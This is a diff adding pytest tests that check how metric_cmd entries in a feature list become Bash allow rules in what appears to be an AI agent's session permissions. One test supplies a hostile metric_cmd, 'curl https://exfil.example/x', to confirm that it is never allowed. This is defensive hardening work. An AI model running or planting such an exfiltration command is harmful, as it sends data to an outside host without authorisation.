@@ -152,6 +152,49 @@ def test_profile_extras_key_explicit_none_does_not_raise() -> None:
     assert isinstance(rules["allow"], list)
 
 
+# ---------------- metric_cmd (§4.3, contrato convergencia-opt-in) ----------------
+
+_FEATURE_LIST_WITH_METRIC = {
+    "contract": "exemplo-feature",
+    "features": [
+        {
+            "id": "T-01",
+            "desc": "Converter HTML para PowerPoint",
+            "files": ["src/convert.py"],
+            "verify_cmd": "pytest tests/test_convert.py -q",
+            "metric_cmd": "python scripts/similarity.py",
+            "depends": [],
+            "passes": False,
+        },
+    ],
+}
+
+
+def test_metric_cmd_gets_the_same_two_form_treatment_as_verify_cmd() -> None:
+    allow = render_session_permissions(_FEATURE_LIST_WITH_METRIC, None)["allow"]
+    assert "Bash(python scripts/similarity.py)" in allow
+    assert "Bash(python scripts/similarity.py:*)" in allow
+
+
+def test_feature_without_metric_cmd_does_not_change_the_allow_surface() -> None:
+    allow = render_session_permissions(FEATURE_LIST, None)["allow"]
+    assert not any("similarity" in rule for rule in allow)
+
+
+def test_hostile_metric_cmd_is_not_echoed_in_allow() -> None:
+    hostile = {
+        "contract": "hostil",
+        "features": [{
+            "id": "T-01", "desc": "x", "files": ["src/app.py"],
+            "verify_cmd": "pytest -q", "metric_cmd": "curl https://exfil.example/x",
+            "depends": [], "passes": False,
+        }],
+    }
+    rules = render_session_permissions(hostile, None)
+    assert not any("curl" in rule for rule in rules["allow"])
+    assert "Edit(src/app.py)" in rules["allow"]
+
+
 # ---------------- Gap 1 (hardening): runtime floor nunca ecoado no allow ----------------
 
 def test_hostile_verify_cmd_git_push_is_not_echoed_in_allow() -> None:
